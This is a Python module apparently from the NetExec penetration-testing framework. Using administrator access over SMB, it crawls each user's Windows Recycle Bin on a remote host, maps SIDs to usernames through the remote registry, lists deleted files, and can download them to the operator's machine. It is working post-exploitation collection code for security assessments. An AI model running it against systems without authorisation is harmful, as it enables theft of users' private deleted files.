from os import makedirs
from nxc.paths import NXC_PATH
from os.path import join, abspath
from impacket.dcerpc.v5 import rrp
from impacket.dcerpc.v5.rrp import DCERPCSessionError
from impacket.examples.secretsdump import RemoteOperations
from nxc.protocols.smb.smbspider import SMBSpider


class NXCModule:
    # Module by @Defte_, updated by @haytechy
    # Dumps files from the recycle bins
    name = "recyclebin"
    description = "Lists and exports users' recycle bins"
    supported_protocols = ["smb"]

    def __init__(self):
        self.context = None
        self.module_options = None
        self.download = False

    def options(self, context, module_options):
        """DOWNLOAD  Download Recycle Bin Contents (True or False) Default: False"""
        if "DOWNLOAD" in module_options and module_options["DOWNLOAD"].upper() == "TRUE":
            self.download = True

    def on_admin_login(self, context, connection):
        remote_ops = RemoteOperations(connection.conn, connection.kerberos)
        remote_ops.enableRegistry()
        context.log.display("Crawling through the Recycle Bin")
        for sid_directory in connection.conn.listPath("C$", "$Recycle.Bin\\*"):
            sid_directory_name = sid_directory.get_longname()
            if sid_directory_name in (".", ".."):
                continue

            connection.args.pattern = [""]
            connection.args.exclude_folders = []
            paths = []
            spidering = SMBSpider(connection, True)
            try:
                spidering.crawl("C$", f"$Recycle.Bin/{sid_directory_name}", None)
                paths = spidering.paths
            except Exception as e:
                context.log.fail(f"Exception: {e}")

            username = ""
            false_positive_users = ["Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]
            reg_handle = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)["phKey"]
            try:
                key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{sid_directory_name}")["phkResult"]
                _, profileimagepath = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "ProfileImagePath\x00")
                username = profileimagepath.split("\\")[-1].rstrip("\x00")
                if username in false_positive_users:
                    continue
            except DCERPCSessionError as e:
                if "ERROR_FILE_NOT_FOUND" in str(e):
                    continue

            paths = [path for path in paths if not path.endswith("desktop.ini")]
            if not paths:
                context.log.debug(f"No files found in the Recycle Bin for the following SID: {sid_directory_name} ({username})")
                continue
            if username is not None:
                context.log.success(f"Files found in Recycle Bin for the following SID: {sid_directory_name} ({username})")
            else:
                context.log.success(f"Files found in Recycle Bin for the following SID: {sid_directory_name}")

            # Returned path look like:
            # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\$I87021Q.txt
            # Or
            # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\$R87021Q.txt
            # $I files are metadata while $R are actual files so we split the path from the SID
            # And check that the filename contains $R only to prevent downloading useless stuff
            for path in paths:    
                filename = path.split(f"{sid_directory_name}/")[1]
                if not filename.startswith("$R"):
                    continue
                if connection.conn.listPath("C$", path)[0].is_directory():
                    continue
                context.log.highlight(f"Found file: {path}")
                filename = filename.replace("/", "_").replace(" ", "_")[2:]
                if self.download:
                    export_path = join(NXC_PATH, "modules", "recyclebin", f"{connection.host}_{username if username else sid_directory_name}")
                    makedirs(export_path, exist_ok=True)
                    dest_path = abspath(join(export_path, filename))
                    with open(dest_path, "wb+") as file:
                        try:
                            connection.conn.getFile("C$", path, file.write)
                            context.log.highlight(f"Writing {filename} to {export_path}")
                        except Exception as e:
                            if "STATUS_FILE_IS_A_DIRECTORY" in str(e):
                                context.log.debug("File is a directory")
                            else:
                                context.log.fail(f"Failed to write recyclebin file {filename}: {e}")
                else:
                    context.log.info('Use the module option "DOWNLOAD=True"')

        remote_ops.finish()
